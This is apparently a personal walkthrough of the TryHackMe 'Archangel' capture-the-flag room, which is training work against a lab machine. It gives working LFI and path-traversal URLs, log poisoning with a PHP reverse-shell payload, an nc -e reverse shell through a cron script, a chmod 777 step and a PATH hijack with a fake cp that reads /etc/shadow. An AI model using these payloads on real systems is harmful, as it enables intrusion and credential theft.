#LFI #path #suid

https://tryhackme.com/r/room/archangel

---
#### Nmap
![[Screenshot_2024-06-10_17-52-14.png]]

~~There is a fake flag leading to a rickroll in `/flags/flag.html`, nothing else but the redirection on the file~~

~~The `/layout`, `/images` and `/pages` have blank page, so I should enum them~~

There was a domain `mafialive.thml` on the main page, I had to add it in my `/etc/hosts` and I go redirected to a blank page with the first flag

Then I found `/test.php` with an lfi vulnerability

I read the `/test.php` file with the php wrapper to know how to bypass the filters
```text
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

I am able to find `/etc/passwd` with the following payload
```text
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd
```

Ok I fuzzed the lfi vulnerability with a new seclist wordlist
```shell
ffuf -u 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../FUZZ' -w /usr/share  
/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 286,310
```

It gave me access to log file and it was bugged like during my tech talk, impossible to open `/var/log/apache2/access.log` until I restarted the target's machine.
Once I restarted I used netcat to send my payload
```shell
nc 10.10.117.226 80
<?= `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.79.56 9001 >/tmp/f` ?>
```

And I triggered my reverse shell by going on
```text
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log
```

And here I m in

Earlier, I've found an `archangel` (the user) script executed by crontab so I gave me full permissions on his home's directory
```shell
chmod -R 777 /home/archangel
```

Better than that, I can setup a reverse shell and connect as `archangel` throught the `/opt/helloworld.sh`:
```shell
echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e sh 10.14.79.56 9002 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v
```

I used the Baron 2 CVE to escalate root

Another way to privesc is to create a `cp` file and change `archangel`'s $PATH to make it executable
The new `cp` file in `/home/archangel/secret`:
```shell
#!/bin/bash
cat /etc/shadow /tmp/shadow
```

Then replace the path
```shell
export PATH=$PWD:$PATH
```

And then execute the `backup` file 